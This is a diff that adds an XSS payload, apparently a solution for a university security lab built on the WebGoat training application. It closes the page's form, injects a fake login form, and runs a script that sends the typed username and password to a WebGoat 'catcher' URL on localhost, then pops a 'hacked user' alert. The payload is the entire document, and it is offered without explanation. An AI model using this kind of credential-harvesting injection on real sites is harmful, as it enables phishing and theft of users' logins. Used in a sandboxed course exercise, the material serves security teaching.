@@ -1,0 +1,17 @@
+</form>
+<form method="post">
+    	<br>
+	Login Form<br>
+	User: <input type="text" name="ece568-2018f-username"><br>
+	Password: <input type="password" name="ece568-2018f-password">
+	<button onclick="runScript();" name="ece568-2018f-submit">Submit</button>
+</form>
+
+<script>
+function runScript(){
+	XSSImage = new Image;
+	XSSImage.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&user=" + document.forms[0].ece568-2018f-username.value +"&password=" + document.forms[0].ece568-2018f-password.value;
+	alert( "hacked user: "+document.forms[0].ece568-2018f-username.value );
+
+}
+</script>
